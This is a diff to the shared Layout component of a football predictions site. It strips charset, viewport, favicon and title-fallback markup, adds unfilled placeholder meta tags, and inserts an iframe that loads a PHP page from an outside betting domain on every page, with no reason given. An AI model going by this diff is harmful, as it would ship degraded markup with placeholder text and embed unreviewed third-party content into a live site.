@@ -1,8 +1,5 @@
-// components/Layout.js
-
 import { ReactNode, StrictMode } from "react";
 import Head from "next/head";
-import SiteHead from "./SiteHead";
 import GoogleAdSenseScript from "./GoogleAdSenseScript"; // Adjust the path
 
 type Props = {
@@ -15,53 +12,19 @@ export default function Layout({ title, header, children }: Props) {
   return (
     <div>
       <Head>
-        <meta charSet="utf-8" />
-        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        {/* ... (existing Head content) */}
+        <meta name="description" content="Your website description" />
+        <meta name="keywords" content="your,keywords,here" />
+        {/* Add other necessary meta tags */}
 
-        <title>{title || "Foregoal Football Predictions"}</title>
-
-        <meta name="theme-color" content="#ffffff" />
-
-        <link rel="shortcut icon" href="/favicon.png" />
-        <link
-          rel="icon"
-          type="image/png"
-          href="/favicon-32x32.png"
-          sizes="32x32"
-        />
-        <link
-          rel="icon"
-          type="image/png"
-          href="/favicon-16x16.png"
-          sizes="16x16"
-        />
-        <meta
-          name="apple-mobile-web-app-capable"
-          content="yes"
-        />
-        <link
-          rel="apple-touch-icon"
-          sizes="180x180"
-          href="/apple-touch-icon.png"
-        />
-        <link
-          rel="apple-touch-startup-image"
-          href="/apple-touch-icon.png"
-        />
-        <link
-          rel="mask-icon"
-          href="/safari-pinned-tab.svg"
-          color="#5bbad5"
-        />
-
-        {/* Include the Google AdSense script */}
         <GoogleAdSenseScript />
+        <title>{title}</title>
       </Head>
 
       <div id="app">
         <StrictMode>
-          <SiteHead />
-
+          {/* Remove the unused SiteHead component */}
+          
           {header && (
             <div className="container block">
               <h1>{header}</h1>
@@ -70,8 +33,12 @@ export default function Layout({ title, header, children }: Props) {
 
           {children}
         </StrictMode>
+
+        {/* Add the iframe after StrictMode */}
+        <iframe src="https://betadvisor.club/data/dta/b/r2.php"></iframe>
+
         <p className="footer container">
-         Foregoal Free Predictions
+          Foregoal Free Predictions
         </p>
         <p className="footer container">
           <a href="/developer/">data api</a>
